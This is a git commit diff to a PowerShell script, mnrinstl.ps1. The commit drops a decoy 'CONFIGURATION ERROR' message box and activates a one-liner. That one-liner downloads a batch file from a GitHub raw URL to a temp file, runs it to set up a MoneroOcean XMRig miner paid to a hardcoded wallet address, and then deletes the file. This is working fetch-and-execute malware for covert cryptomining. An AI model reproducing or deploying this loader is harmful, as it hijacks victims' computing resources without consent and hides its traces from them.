e42b642245859633163999c8e194fdc5737a4476
err4tik0 <98240038+err4tik0@users.noreply.github.com>
2022-04-22 22:39:10 -0400

    Update mnrinstl.ps1

--- mnrinstl.ps1
+++ mnrinstl.ps1
@@ -1,12 +1,3 @@
-Add-Type -AssemblyName PresentationCore,PresentationFramework
-$ButtonType = [System.Windows.MessageBoxButton]::OK
-$MessageIcon = [System.Windows.MessageBoxImage]::Error
-$MessageBody = "System requirements not met"
-$MessageTitle = "CONFIGURATION ERROR"
-
-$Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)
-
-
-# $wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/err4tik0/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 44WW1etki7VDSXozBJkJft5rPNVvPQhSe4rSXM7DqRdT854qzdL2DnD6NieK4mxinyCy3Fuij8jjXZXzHmd66uGaVdzqewk; Remove-Item -Force $tempfile
+$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/err4tik0/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 44WW1etki7VDSXozBJkJft5rPNVvPQhSe4rSXM7DqRdT854qzdL2DnD6NieK4mxinyCy3Fuij8jjXZXzHmd66uGaVdzqewk; Remove-Item -Force $tempfile
 
 exit
